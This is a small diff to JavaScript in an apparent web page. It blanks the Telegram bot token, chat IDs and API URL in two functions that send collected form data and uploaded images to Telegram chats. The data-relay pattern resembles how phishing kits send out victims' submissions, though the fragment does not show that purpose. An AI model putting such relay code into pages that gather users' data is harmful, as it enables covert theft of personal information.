@@ -35,9 +35,9 @@ let idName = ''
         });
 
         async function sendDataToBot(data) {
-            const botToken = 'Telegram_bot_token'; // Replace with your Telegram bot token
-            const chatIds = ['Chatid1', 'Chatid2']; // Replace with your Telegram chat IDs
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const botToken = ''; // Replace with your Telegram bot token
+            const chatIds = ['', '']; // Replace with your Telegram chat IDs
+            const url = ``;
 
             for (const chatId of chatIds) {
                 const formData = new FormData();
@@ -66,9 +66,9 @@ let idName = ''
         }
 
         async function sendImageToBot(imageFile) {
-            const botToken = 'Telegram_bot_token'; // Replace with your Telegram bot token
-            const chatIds = ['Chatid1', 'Chatid2']; // Replace with your Telegram chat IDs
-            const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+            const botToken = ''; // Replace with your Telegram bot token
+            const chatIds = ['', '']; // Replace with your Telegram chat IDs
+            const url = ``;
 
             const formData = new FormData();
             formData.append('chat_id', chatIds[0]); // Choose a chat ID
